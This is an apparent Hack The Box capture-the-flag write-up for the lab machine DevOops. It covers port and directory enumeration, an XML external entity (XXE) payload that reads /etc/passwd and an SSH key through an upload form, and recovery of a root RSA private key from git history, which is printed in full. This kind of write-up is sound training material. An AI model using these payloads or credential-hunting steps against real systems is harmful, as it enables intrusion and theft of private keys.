---
title: "[HTB] Machine: DevOops"
description: "[HTB] Machine: DevOops"
date: 2023-10-17
menu:
  sidebar:
    name: "[HTB] Machine: DevOops"
    identifier: htb-machine-DevOops
    parent: htb-machines-linux
    weight: 10
hero: images/devoops.png
tags: ["HTB", "xxe", "ssh", "git", "deserialization", "pickle", "rss"]
---

# DevOops
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.91                                                                                 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:44 BST
Nmap scan report for 10.10.10.91 (10.10.10.91)
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 749.62 seconds

```
```
└─$ nmap -Pn -p22,5000 -sC -sV 10.10.10.91  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:58 BST
Nmap scan report for 10.10.10.91 (10.10.10.91)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds

```

- Web Server

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u http://10.10.10.91:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt --depth 1

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.91:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1816l    15358w   962741c http://10.10.10.91:5000/feed
200      GET        1l       31w      285c http://10.10.10.91:5000/
200      GET        1l       39w      347c http://10.10.10.91:5000/upload

```

## Foothold
- http://10.10.10.91:5000/feed
  - Image from root path

![](./images/2.png)

- http://10.10.10.91:5000/upload
  - `xml` upload page

![](./images/3.png)

- Let's upload test `xml`
```
<Author>Test Author</Author>
<Subject>Test Subject</Subject>
<Content>Test Content</Content>
```

![](./images/4.png)

- It fails, probably due to some missing elements in `xml`
  - Googling for `xml feed` shows https://www.w3schools.com/xml/xml_rss.asp
  - Let's add `channel` element
```
<channel>
<Author>Test Author</Author>
<Subject>Test Subject</Subject>
<Content>Test Content</Content>
</channel>
```

![](./images/5.png)

- It works and the file is located in indicated directory
```
└─$ curl http://10.10.10.91:5000/uploads/test.xml                                                                                   
<channel>
<Author>Test Author</Author>
<Subject>Test Subject</Subject>
<Content>Test Content</Content>
</channel>
           
```

- We can test for `XXE`
  - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
```
<!--?xml version="1.0" ?-->

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>

<channel>
<Author>&xxe;</Author>
<Subject>Test Subject</Subject>
<Content>Test Content</Content>
</channel>
```

![](./images/6.png)

- We have `git`, `roosa` users
  - We saw that the file path is in `roosa`'s home folder
  - Usually when we have read vulnerabilities, we should start with `id_rsa`
  - And `roosa` has the key, which we can now use to connect via `ssh`

![](./images/7.png)


- Save it to file and `chmod 600`
```
└─$ ssh roosa@10.10.10.91 -i id_rsa.devoops
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

roosa@devoops:~$ 

```
## Root
- `roosa` has interesting folder `work`
```
roosa@devoops:~$ ls -lha work/
total 12K
drwxrwxr-x  3 roosa roosa 4.0K Mar 26  2021 .
drwxr-xr-x 22 roosa roosa 4.0K Sep 23  2022 ..
drwxrwx---  5 roosa roosa 4.0K Mar 26  2021 blogfeed
```
```
roosa@devoops:~/work/blogfeed$ ls -lha
total 28K
drwxrwx--- 5 roosa roosa 4.0K Mar 26  2021 .
drwxrwxr-x 3 roosa roosa 4.0K Mar 26  2021 ..
drwxrwx--- 8 roosa roosa 4.0K Mar 26  2021 .git
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4.0K Mar 26  2021 resources
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
drwxrwx--- 2 roosa roosa 4.0K Mar 26  2021 src

```

- It a `git` repo
```
roosa@devoops:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   run-gunicorn.sh

Untracked files:
  (use "git add <file>..." to include in what will be committed)

        src/.feed.py.swp
        src/access.log
        src/app.py
        src/app.py~
        src/config.py
        src/devsolita-snapshot.png
        src/feed.log
        src/feed.pyc
        src/save.p

no changes added to commit (use "git add" and/or "git commit -a")

```

- We can check commit history
  - `git log --name-only --oneline` or `git log --pretty=oneline`
  - We see interesting commit with comments like `add key for feed integration from tnerprise backend`
  - Right after that commit we see `reverted accidental commit with proper key`
```
roosa@devoops:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
d1b52a44e6dc81023420347e257ee5f Initial commit
```

- Let's check `resources/integration/authcredentials.key` from `d387abf`
  - We can try to connect as `root` using that key
```
roosa@devoops:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
roosa@devoops:~/work/blogfeed$ cat resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

- Upload to your box and connect as `root`
```
└─$ ssh root@10.10.10.91 -i id_rsa.root 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Sep 23 09:46:30 2022
root@devoops:~# 

```

- [Pickle](https://0xdf.gitlab.io/2018/10/13/htb-devoops.html#beyond-root) `deserialization` attack path